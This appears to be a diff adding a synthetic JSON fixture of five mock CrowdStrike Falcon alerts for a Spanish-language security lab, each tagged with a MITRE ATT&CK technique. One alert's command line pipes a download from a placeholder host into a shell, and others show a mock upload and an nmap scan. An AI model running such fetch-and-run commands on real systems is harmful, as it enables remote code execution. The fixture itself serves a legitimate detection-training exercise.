@@ -1,0 +1,125 @@
+{
+  "_disclaimer": "DATOS 100% FICTICIOS - Generados para el Laboratorio 3 FDSI. No provienen de CrowdStrike Falcon ni de ningun entorno real. Ninguna IP, hostname, usuario o hash corresponde a un activo real.",
+  "meta": {
+    "source": "crowdstrike-falcon-mock",
+    "schema_version": "1.0",
+    "generated_at": "2026-09-02T14:00:00Z"
+  },
+  "resources": [
+    {
+      "composite_id": "ldt:mock:0001",
+      "severity": 90,
+      "severity_name": "Critical",
+      "tactic": "Credential Access",
+      "technique": "OS Credential Dumping",
+      "technique_id": "T1003",
+      "status": "new",
+      "confidence": 95,
+      "created_timestamp": "2026-09-02T12:04:11Z",
+      "device": {
+        "hostname": "WEB-LAB-01",
+        "platform_name": "Linux",
+        "local_ip": "10.10.10.11",
+        "agent_version": "7.14.0-mock"
+      },
+      "filename": "mimidump.mock",
+      "sha256": "0000000000000000000000000000000000000000000000000000000000000001",
+      "user_name": "svc_lab_a",
+      "cmdline": "/usr/bin/mock-dump --target lsass",
+      "assigned_to": null,
+      "notes": "Alerta sintetica de laboratorio."
+    },
+    {
+      "composite_id": "ldt:mock:0002",
+      "severity": 70,
+      "severity_name": "High",
+      "tactic": "Execution",
+      "technique": "Command and Scripting Interpreter",
+      "technique_id": "T1059",
+      "status": "in_progress",
+      "confidence": 80,
+      "created_timestamp": "2026-09-02T12:31:47Z",
+      "device": {
+        "hostname": "API-LAB-01",
+        "platform_name": "Linux",
+        "local_ip": "10.10.10.12",
+        "agent_version": "7.14.0-mock"
+      },
+      "filename": "stage.sh",
+      "sha256": "0000000000000000000000000000000000000000000000000000000000000002",
+      "user_name": "svc_lab_b",
+      "cmdline": "/bin/sh -c curl http://mock.invalid/payload | sh",
+      "assigned_to": "analista_demo_1",
+      "notes": "Alerta sintetica de laboratorio."
+    },
+    {
+      "composite_id": "ldt:mock:0003",
+      "severity": 50,
+      "severity_name": "Medium",
+      "tactic": "Discovery",
+      "technique": "Network Service Discovery",
+      "technique_id": "T1046",
+      "status": "new",
+      "confidence": 60,
+      "created_timestamp": "2026-09-02T13:02:09Z",
+      "device": {
+        "hostname": "DB-LAB-01",
+        "platform_name": "Linux",
+        "local_ip": "10.10.10.13",
+        "agent_version": "7.14.0-mock"
+      },
+      "filename": "nmap.mock",
+      "sha256": "0000000000000000000000000000000000000000000000000000000000000003",
+      "user_name": "svc_lab_c",
+      "cmdline": "nmap -sV -p 80 10.10.10.0/24",
+      "assigned_to": null,
+      "notes": "Alerta sintetica de laboratorio."
+    },
+    {
+      "composite_id": "ldt:mock:0004",
+      "severity": 30,
+      "severity_name": "Low",
+      "tactic": "Persistence",
+      "technique": "Scheduled Task/Job",
+      "technique_id": "T1053",
+      "status": "closed",
+      "confidence": 40,
+      "created_timestamp": "2026-09-02T13:20:55Z",
+      "device": {
+        "hostname": "WEB-LAB-01",
+        "platform_name": "Linux",
+        "local_ip": "10.10.10.11",
+        "agent_version": "7.14.0-mock"
+      },
+      "filename": "cron.mock",
+      "sha256": "0000000000000000000000000000000000000000000000000000000000000004",
+      "user_name": "svc_lab_a",
+      "cmdline": "crontab -l",
+      "assigned_to": "analista_demo_2",
+      "notes": "Alerta sintetica de laboratorio. Cerrada como falso positivo."
+    },
+    {
+      "composite_id": "ldt:mock:0005",
+      "severity": 90,
+      "severity_name": "Critical",
+      "tactic": "Exfiltration",
+      "technique": "Exfiltration Over Web Service",
+      "technique_id": "T1567",
+      "status": "new",
+      "confidence": 90,
+      "created_timestamp": "2026-09-02T13:41:02Z",
+      "device": {
+        "hostname": "API-LAB-01",
+        "platform_name": "Linux",
+        "local_ip": "10.10.10.12",
+        "agent_version": "7.14.0-mock"
+      },
+      "filename": "upload.mock",
+      "sha256": "0000000000000000000000000000000000000000000000000000000000000005",
+      "user_name": "svc_lab_b",
+      "cmdline": "/usr/bin/mock-upload --dest mock.invalid",
+      "assigned_to": null,
+      "notes": "Alerta sintetica de laboratorio."
+    }
+  ]
+}
